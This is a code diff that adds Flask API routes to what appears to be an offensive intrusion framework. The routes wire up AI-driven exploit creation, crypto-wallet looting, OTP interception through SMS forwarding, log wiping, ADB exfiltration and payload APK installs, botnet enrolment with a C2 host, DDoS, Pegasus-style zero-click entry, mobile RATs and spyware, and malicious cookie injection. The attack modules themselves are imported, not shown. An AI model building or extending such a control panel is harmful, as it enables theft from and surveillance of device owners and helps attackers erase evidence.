@@ -1329,4 +1329,267 @@ def register_routes(app, agents, API):
                                 project=d.get("project"),
                                 attach=d.get("attach")))
 
+    # ---- Catalog / CVE / AI Exploit ----
+    @app.route("/api/catalog/exploits")
+    def catalog_exploits():
+        from quantum.catalog.exploit_catalog import organize_exploits
+        return jsonify(organize_exploits())
+    @app.route("/api/catalog/zerodays")
+    def catalog_zerodays():
+        from quantum.catalog.exploit_catalog import project_zero_zerodays
+        return jsonify({"zerodays": project_zero_zerodays()})
+    @app.route("/api/catalog/cve_feed")
+    def catalog_cve_feed():
+        from quantum.catalog.exploit_catalog import cve_feed_by_type
+        return jsonify(cve_feed_by_type())
+    @app.route("/api/catalog/ai_create", methods=["POST"])
+    def catalog_ai_create():
+        from quantum.catalog.exploit_catalog import ai_create_exploit
+        d = request.json or {}
+        return jsonify(ai_create_exploit(d.get("prompt", ""), model=d.get("model")))
+
+    @app.route("/api/bluetooth/state")
+    def bt_state():
+        from quantum.control.bluetooth import bluetooth_dashboard_state
+        return jsonify(bluetooth_dashboard_state())
+
+    @app.route("/api/sdr/state")
+    def sdr_state():
+        from quantum.control.sdr import sdr_dashboard_state
+        return jsonify(sdr_dashboard_state())
+
+    @app.route("/api/imsi/state")
+    def imsi_state():
+        from quantum.control.imsi import imsi_dashboard_state
+        return jsonify(imsi_dashboard_state())
+
+    @app.route("/api/hid/state")
+    def hid_state():
+        from quantum.control.hid import hid_dashboard_state
+        return jsonify(hid_dashboard_state())
+
+    @app.route("/api/crypto/search")
+    def crypto_search():
+        from quantum.postexploit.cryptowallet import search_crypto_artifacts
+        paths = request.args.getlist("path") or ["~/"]
+        return jsonify(search_crypto_artifacts(paths))
+
+    @app.route("/api/crypto/loot", methods=["POST"])
+    def crypto_loot():
+        from quantum.postexploit.cryptowallet import loot_crypto_artefacts
+        d = request.json or {}
+        return jsonify(loot_crypto_artefacts(d.get("artifacts", {})))
+
+    @app.route("/api/crypto/dashboard")
+    def crypto_dash():
+        from quantum.postexploit.cryptowallet import crypto_dashboard_state
+        return jsonify(crypto_dashboard_state())
+
+    @app.route("/api/biometric/search")
+    def biometric_search():
+        from quantum.postexploit.biometric_clone import find_biometric_artifacts
+        return jsonify(find_biometric_artifacts())
+    @app.route("/api/biometric/style")
+    def biometric_style():
+        from quantum.postexploit.biometric_clone import analyze_sms_style
+        return jsonify(analyze_sms_style())
+    @app.route("/api/biometric/dashboard")
+    def biometric_dash():
+        from quantum.postexploit.biometric_clone import biometric_dashboard_state
+        return jsonify(biometric_dashboard_state())
+
+    @app.route("/api/otp/intercept")
+    def otp_intercept():
+        from quantum.postexploit.otp_bypass import intercept_sms_state
+        return jsonify(intercept_sms_state())
+    @app.route("/api/otp/forward", methods=["POST"])
+    def otp_forward():
+        from quantum.postexploit.otp_bypass import set_sms_forwarding
+        d = request.json or {}
+        return jsonify(set_sms_forwarding(d.get("to_number")))
+    @app.route("/api/otp/reset", methods=["POST"])
+    def otp_reset():
+        from quantum.postexploit.otp_bypass import reset_sms_forwarding
+        return jsonify(reset_sms_forwarding())
+    @app.route("/api/otp/dashboard")
+    def otp_dash():
+        from quantum.postexploit.otp_bypass import otp_bypass_dashboard_state
+        return jsonify(otp_bypass_dashboard_state())
+
+    @app.route("/api/logclean/find")
+    def logclean_find():
+        from quantum.postexploit.log_cleaner import find_target_logs
+        return jsonify({"logs": find_target_logs()})
+    @app.route("/api/logclean/clean", methods=["POST"])
+    def logclean_clean():
+        from quantum.postexploit.log_cleaner import clear_target_logs
+        return jsonify(clear_target_logs())
+    @app.route("/api/logclean/dashboard")
+    def logclean_dash():
+        from quantum.postexploit.log_cleaner import log_cleaner_dashboard_state
+        return jsonify(log_cleaner_dashboard_state())
+
+    @app.route("/api/adb/dashboard")
+    def adb_dash():
+        from quantum.postexploit.adb_exploit import adb_dashboard_state
+        return jsonify(adb_dashboard_state())
+    @app.route("/api/adb/usb")
+    def adb_usb():
+        from quantum.postexploit.adb_exploit import adb_usb_debug_status
+        return jsonify(adb_usb_debug_status())
+    @app.route("/api/adb/screen", methods=["POST"])
+    def adb_screen():
+        from quantum.postexploit.adb_exploit import adb_screen_capture
+        d = request.json or {}
+        return jsonify(adb_screen_capture(d.get("output_path", "screenshot.png")))
+    @app.route("/api/adb/logcat", methods=["POST"])
+    def adb_logcat():
+        from quantum.postexploit.adb_exploit import adb_logcat_extract
+        d = request.json or {}
+        return jsonify(adb_logcat_extract(d.get("output_path", "logcat.txt")))
+    @app.route("/api/adb/pull", methods=["POST"])
+    def adb_pull():
+        from quantum.postexploit.adb_exploit import adb_file_pull
+        d = request.json or {}
+        return jsonify(adb_file_pull(d.get("remote_path"), d.get("local_path", "exfil/")))
+    @app.route("/api/adb/deploy", methods=["POST"])
+    def adb_deploy():
+        from quantum.postexploit.adb_exploit import adb_install_apk
+        d = request.json or {}
+        return jsonify(adb_install_apk(d.get("apk_path", "payload.apk")))
+
+    @app.route("/api/pivot/dashboard")
+    def pivot_dash():
+        from quantum.postexploit.pivot_lateral import pivot_dashboard_state
+        return jsonify(pivot_dashboard_state())
+    @app.route("/api/botnet/add", methods=["POST"])
+    def botnet_add():
+        from quantum.control.botnet import add_device_to_botnet
+        d = request.json or {}
+        return jsonify(add_device_to_botnet(d.get("device_type"), d.get("ip"), d.get("c2_host")))
+    @app.route("/api/ddos/dashboard")
+    def ddos_dash():
+        from quantum.postexploit.ddos import ddos_dashboard_state
+        return jsonify(ddos_dashboard_state())
+    @app.route("/api/c2proxy/dashboard")
+    def c2proxy_dash():
+        from quantum.postexploit.c2_proxy import c2_proxy_dashboard_state
+        return jsonify(c2_proxy_dashboard_state())
+
+    @app.route("/api/autoconfig/dashboard")
+    def autoconfig_dash():
+        from quantum.postexploit.auto_config import auto_config_dashboard_state
+        return jsonify(auto_config_dashboard_state())
+    @app.route("/api/autoconfig/defaults")
+    def autoconfig_defaults():
+        from quantum.postexploit.auto_config import apply_defaults
+        # a GET must not require a JSON body
+        d = request.get_json(silent=True) or {}
+        tool = d.get("tool") or request.args.get("tool", "all")
+        return jsonify(apply_defaults(tool))
+
+    @app.route("/api/god_mode/config")
+    def god_mode_config():
+        from quantum.postexploit.god_mode import god_mode_config
+        return jsonify(god_mode_config())
+
+    @app.route("/api/darkweb/dashboard")
+    def darkweb_dash():
+        from quantum.postexploit.dark_web_browser import dark_web_dashboard_state
+        return jsonify(dark_web_dashboard_state())
+    @app.route("/api/darkweb/search")
+    def darkweb_search():
+        from quantum.postexploit.dark_web_browser import crawler_search
+        # a GET must not require a JSON body
+        d = request.get_json(silent=True) or {}
+        query = d.get("query") or request.args.get("query", "")
+        return jsonify(crawler_search(query))
+
+    @app.route("/api/vault/dashboard")
+    def vault_dash():
+        from quantum.postexploit.vault_share import vault_dashboard_state
+        return jsonify(vault_dashboard_state())
+    @app.route("/api/vault/mount")
+    def vault_mount():
+        from quantum.postexploit.vault_share import vault_mount
+        d = request.get_json(silent=True) or {}
+        vault_path = d.get("vault_path") or request.args.get("vault")
+        password_ref = d.get("password_ref") or request.args.get(
+            "password_ref", "keyfile")
+
+        return jsonify(vault_mount(vault_path, password_ref))
+
+    @app.route("/api/nso_pegasus/dashboard")
+    def nso_dash():
+        from quantum.postexploit.nso_pegasus_ios import nso_pegasus_dashboard_state
+        return jsonify(nso_pegasus_dashboard_state())
+    @app.route("/api/nso_pegasus/forced_entry", methods=["POST"])
+    def nso_forced():
+        from quantum.postexploit.nso_pegasus_ios import forced_entry_config
+        d = request.json or {}
+        return jsonify(forced_entry_config(d.get("device_type","ios"), d.get("method","zero_click")))
+
+    @app.route("/api/mitm/dashboard")
+    def mitm_dash():
+        from quantum.postexploit.mitm_dashboard import mitm_dashboard_state
+        return jsonify(mitm_dashboard_state())
+    @app.route("/api/rat/dashboard")
+    def rat_dash():
+        from quantum.postexploit.rat_mobile import rat_dashboard_state
+        return jsonify(rat_dashboard_state())
+    @app.route("/api/rat/ios")
+    def rat_ios():
+        from quantum.postexploit.rat_mobile import rat_tab_function
+        return jsonify(rat_tab_function("iOS Monitor", "monitor"))
+    @app.route("/api/rat/android")
+    def rat_android():
+        from quantum.postexploit.rat_mobile import rat_tab_function
+        return jsonify(rat_tab_function("Android Monitor", "monitor"))
+    @app.route("/api/rat/mobile_spy")
+    def rat_mspy():
+        from quantum.postexploit.rat_mobile import rat_tab_function
+        return jsonify(rat_tab_function("Mobile Spy", "mspy_features"))
+
+    @app.route("/api/cve/update")
+    def cve_update():
+        from quantum.postexploit.cve_update import cve_update_state
+        return jsonify(cve_update_state())
+
+    @app.route("/api/mobile/verify")
+    def mobile_verify():
+        from quantum.postexploit.mobile_verification import mobile_verification_state, verify_all_functions
+        return jsonify({"state": mobile_verification_state(), "results": verify_all_functions()})
+
+    @app.route("/api/cookie/manager")
+    def cookie_manager_dash():
+        from quantum.postexploit.cookie_manager import cookie_manager_state
+        return jsonify(cookie_manager_state())
+    @app.route("/api/cookie/create")
+    def cookie_create():
+        from quantum.postexploit.cookie_manager import create_malicious_cookie
+        d = request.get_json(silent=True) or {}
+        name = d.get("name") or request.args.get("name", "session")
+        value = d.get("value") or request.args.get("value", "test")
+        domain = d.get("domain") or request.args.get("domain", "localhost")
+
+        return jsonify(create_malicious_cookie(name, value, domain))
+    @app.route("/api/cookie/inject", methods=["POST"])
+    def cookie_inject():
+        from quantum.postexploit.cookie_manager import inject_cookie_session
+        d = request.json or {}
+        return jsonify(inject_cookie_session(d.get("cookie_string"), d.get("target_path","cookies.txt")))
+
+    @app.route("/api/traffic/analysis")
+    def traffic_dash():
+        from quantum.postexploit.traffic_analysis import traffic_dashboard_state
+        return jsonify(traffic_dashboard_state())
+    @app.route("/api/persistence/check")
+    def persistence_check():
+        from quantum.postexploit.persistence_checker import check_persistence
+        return jsonify(check_persistence())
+    @app.route("/api/advanced/config")
+    def adv_config():
+        from quantum.postexploit.advanced_config_aggregator import aggregate_all
+        return jsonify(aggregate_all())
+
     return app
